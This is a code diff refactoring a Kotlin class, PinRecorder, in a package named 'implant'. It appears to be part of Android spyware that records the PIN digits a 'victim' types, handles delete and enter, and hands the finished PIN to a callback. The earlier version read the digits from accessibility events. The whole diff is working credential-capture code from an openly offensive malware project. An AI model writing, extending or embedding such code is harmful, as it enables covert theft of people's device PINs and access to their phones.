@@ -8,7 +8,6 @@
 * */
 package com.cooperthecoder.implant
 
-import android.view.accessibility.AccessibilityEvent
 import java.util.*
 
 class PinRecorder(val callback: Callback) {
@@ -29,19 +28,18 @@ class PinRecorder(val callback: Callback) {
         @JvmStatic val EMERGENCY = "[Emergency]"
     }
 
-    private val pinQueue: Queue<String> = LinkedList<String>()
+    private val digitQueue: Queue<String> = LinkedList<String>()
 
-    fun appendPinDigit(event: AccessibilityEvent) {
-        val pinDigit = event.text.toString()
-        when (pinDigit) {
+    fun appendPinDigit(digit: String) {
+        when (digit) {
             PinPad.DELETE -> {
                 // Remove the last digit logged if the user pressed delete.
-                pinQueue.poll()
+                digitQueue.poll()
             }
 
             PinPad.ENTER -> {
                 // When the victim presses enter, get ready for a new one.
-                callback.onPinRecorded(pinQueue.joinToString("-"))
+                callback.onPinRecorded(digitQueue.joinToString("-"))
                 clearPinQueue()
             }
 
@@ -50,15 +48,15 @@ class PinRecorder(val callback: Callback) {
             }
 
             else -> {
-                // Otherwise, add the digit to the pinQueue.
-                pinQueue.add(pinDigit)
+                // Otherwise, add the digit to the digitQueue.
+                digitQueue.add(digit)
             }
 
         }
     }
 
     fun clearPinQueue() {
-        pinQueue.clear()
+        digitQueue.clear()
     }
 
     interface Callback {
